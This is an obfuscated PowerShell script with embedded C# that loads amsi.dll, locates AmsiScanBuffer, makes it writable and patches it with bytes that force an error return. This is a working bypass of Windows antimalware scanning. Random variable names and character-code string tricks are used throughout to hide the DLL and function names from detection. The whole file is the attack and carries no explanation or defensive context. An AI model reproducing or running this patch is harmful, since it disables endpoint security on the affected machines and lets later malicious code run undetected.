$tYVAg = @"
using System;
using System.Runtime.InteropServices;
public class tYVAg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Y3bQP5tqBRw4QZ, string beH6cnFKnBMs72oOLzes);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xjttj0N, UIntPtr F5OZgoxXd0j, uint VgrVmbb, out uint TwhyK9mksng5RTp);
}
"@

Add-Type $tYVAg

$GeNwMJRDo1LFA46aAuF = [tYVAg]::LoadLibrary("$(('àms'+'í.d'+'ll').NORmAlizE([char]([BYtE]0x46)+[CHAR]([bYTE]0x6f)+[cHAr]([bYTE]0x72)+[CHar](109+79-79)+[CHAr](68+9-9)) -replace [chaR](1+91)+[CHar]([bYtE]0x70)+[CHAr](123+95-95)+[CHAr]([bytE]0x4d)+[ChAr](110*95/95)+[Char](125+1-1))")
$H6rxgaSl8m8Ud = [tYVAg]::GetProcAddress($GeNwMJRDo1LFA46aAuF, "$(('ÂmsìScánB'+'ûffér').NOrMalIZE([ChAR](70)+[ChAR](111)+[cHAR]([bYtE]0x72)+[char](109*55/55)+[chaR]([BYTe]0x44)) -replace [CHar]([bYTE]0x5c)+[cHAR](112+10-10)+[CHaR](123)+[Char]([BYTE]0x4d)+[chAR]([BYte]0x6e)+[cHar](125))")
$p = 0
[tYVAg]::VirtualProtect($H6rxgaSl8m8Ud, [uint32]5, 0x40, [ref]$p)
$CEXsQLf0jEkhHluC = "0xB8"
$e_O9Z = "0x57"
$Y3Yad = "0x00"
$v0hmUC6s = "0x07"
$hPG = "0x80"
$iXHtvS9hg2T = "0xC3"
$o9nIsvJvy0DEkrhv = [Byte[]] ($CEXsQLf0jEkhHluC,$e_O9Z,$Y3Yad,$v0hmUC6s,+$hPG,+$iXHtvS9hg2T)
[System.Runtime.InteropServices.Marshal]::Copy($o9nIsvJvy0DEkrhv, 0, $H6rxgaSl8m8Ud, 6)